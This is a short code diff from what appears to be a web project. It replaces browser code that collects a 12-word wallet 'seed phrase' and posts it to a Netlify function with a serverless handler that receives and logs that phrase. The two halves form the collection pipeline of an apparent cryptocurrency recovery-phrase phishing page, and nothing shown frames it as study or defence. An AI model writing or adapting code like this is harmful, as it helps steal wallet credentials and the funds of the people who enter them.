@@ -1,26 +1,24 @@
-continueBtn.addEventListener('click', async () => {
-    // Ensure we have exactly 12 words
-    if (words.length !== TOTAL_WORDS) {
-        console.log("Seed phrase incomplete");
-        return;
-    }
+exports.handler = async (event) => {
+  console.log("Function triggered");
+  console.log("Raw body:", event.body);
 
-    const phrase = words.join(" ");
+  try {
+    const { phrase } = JSON.parse(event.body || "{}");
 
-    try {
-        const response = await fetch(".netlify/functions/receiveWords", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ phrase })
-        });
+    console.log("Received phrase:", phrase);
 
-        const result = await response.json();
-        console.log("Netlify function response:", result);
+    return {
+      statusCode: 200,
+      body: JSON.stringify({ ok: true, phrase })
+    };
 
-        // You can redirect or show a success message here
-        // window.location.href = "/next-page.html";
+  } catch (err) {
+    console.log("Error parsing JSON:", err);
 
-    } catch (error) {
-        console.error("Error sending phrase:", error);
-    }
-});
+    return {
+      statusCode: 400,
+      body: JSON.stringify({ error: "Invalid JSON" })
+    };
+  }
+};
+
